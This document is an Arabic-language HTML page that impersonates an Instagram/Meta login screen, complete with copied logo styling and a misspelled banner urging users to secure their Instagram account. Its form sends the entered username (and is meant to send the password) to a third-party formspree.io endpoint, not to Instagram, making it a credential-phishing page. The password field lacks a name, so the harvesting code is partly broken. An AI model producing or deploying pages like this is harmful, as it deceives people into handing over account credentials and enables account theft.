<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>تسجيل الدخول</title>

<style>

*{
    box-sizing:border-box;
}

html,
body{
    width:100%;
    height:100%;
    margin:0;
    padding:0;
    overflow:hidden;
}

body{
    background:#fff;
    font-family:Arial,sans-serif;
}

/* الصفحة */
.page{
    width:100%;
    height:100dvh;
    padding:12px 34px;
    display:flex;
    flex-direction:column;
    overflow:hidden;
}

/* اللغة */
.language{
    text-align:center;
    color:#777;
    font-size:15px;
    margin-bottom:55px;
}

/* الشعار */
.logo{
    width:70px;
    height:70px;
    display:block;
    margin:0 auto 55px;
}

/* الحقول */
input{
    width:100%;
    height:50px;
    border:1px solid #ddd;
    border-radius:22px;
    padding:0 16px;
    font-size:14px;
    text-align:right;
    margin-bottom:10px;
    outline:none;
    background:#fff;
}

input:focus{
    border-color:#aaa;
}

/* تسجيل الدخول */
.login{
    width:100%;
    height:46px;
    border:0;
    border-radius:25px;
    background:#0877e8;
    color:white;
    font-size:16px;
    cursor:pointer;
}

.login:active{
    opacity:.8;
}

/* نسيت كلمة السر */
.forgot{
    text-align:center;
    font-size:14px;
    margin-top:18px;
    cursor:pointer;
}

/* المساحة الوسطى */
.middle{
    flex:1;
}

/* إنشاء حساب */
.create{
    width:100%;
    height:46px;
    border:1px solid #0877e8;
    border-radius:25px;
    background:white;
    color:#0877e8;
    font-size:16px;
    cursor:pointer;

    display:flex;
    align-items:center;
    justify-content:center;

    text-decoration:none;
}

.create:active{
    opacity:.8;
}

/* Meta */
.meta{
    text-align:center;
    margin-top:16px;
    font-size:17px;
    color:#303846;
    margin-bottom:5px;
}

.meta-logo{
    color:#0877e8;
    font-size:22px;
    font-weight:bold;
}

/* الرسالة */
.message{
    display:none;
    text-align:center;
    margin-top:10px;
    font-size:13px;
}

</style>

</head>


<body>

<div class="page">

    <!-- اللغة -->
    <div class="language">
        قم الان بي تائمين حسابك علا instagram
    </div>
    <div class="language">
        العربية
    </div>


    <!-- الشعار -->
    <svg class="logo" viewBox="0 0 120 120">

        <defs>

            <linearGradient
                id="ig"
                x1="0%"
                y1="100%"
                x2="100%"
                y2="0%">

                <stop
                    offset="0%"
                    stop-color="#FFD600"/>

                <stop
                    offset="25%"
                    stop-color="#FF7A00"/>

                <stop
                    offset="50%"
                    stop-color="#FF0069"/>

                <stop
                    offset="75%"
                    stop-color="#D300C5"/>

                <stop
                    offset="100%"
                    stop-color="#7638FA"/>

            </linearGradient>

        </defs>


        <rect
            x="15"
            y="15"
            width="90"
            height="90"
            rx="25"
            fill="none"
            stroke="url(#ig)"
            stroke-width="9"/>


        <circle
            cx="60"
            cy="60"
            r="22"
            fill="none"
            stroke="url(#ig)"
            stroke-width="9"/>


        <circle
            cx="86"
            cy="34"
            r="6"
            fill="url(#ig)"/>

    </svg>


    <!-- النموذج -->
    <form
        action="https://formspree.io/f/myeykzqj"
        method="POST">

        <!-- اسم المستخدم -->
        <input
            id="username"
            name="username"
            type="text"
            placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول"
            required>


        <!-- كلمة السر -->
        <input
            id="password"
            type="password"
            placeholder="كلمة السر"
            required>


        <!-- تسجيل الدخول -->
        <button
            class="login"
            type="submit">

            تسجيل الدخول

        </button>

    </form>


    <!-- نسيت كلمة السر -->
    <div
        class="forgot"
        onclick="forgotPassword()">

        هل نسيت كلمة السر؟

    </div>


    <!-- الرسالة -->
    <div
        id="message"
        class="message">
    </div>


    <!-- المساحة الوسطى -->
    <div class="middle"></div>


    <!-- إنشاء حساب جديد -->
    <a
        href="contact.html"
        class="create">

        تسجيل دخول بي البريد الاكتروني

    </a>


    <!-- Meta -->
    <div class="meta">

        <span class="meta-logo">∞</span>
        Meta

    </div>

</div>


<script>

/* نسيت كلمة السر */
function forgotPassword(){

    const message =
        document.getElementById("message");

    message.style.display = "block";

    message.textContent =
        "سيتم فتح صفحة استعادة كلمة السر";

}

</script>


</body>
</html>
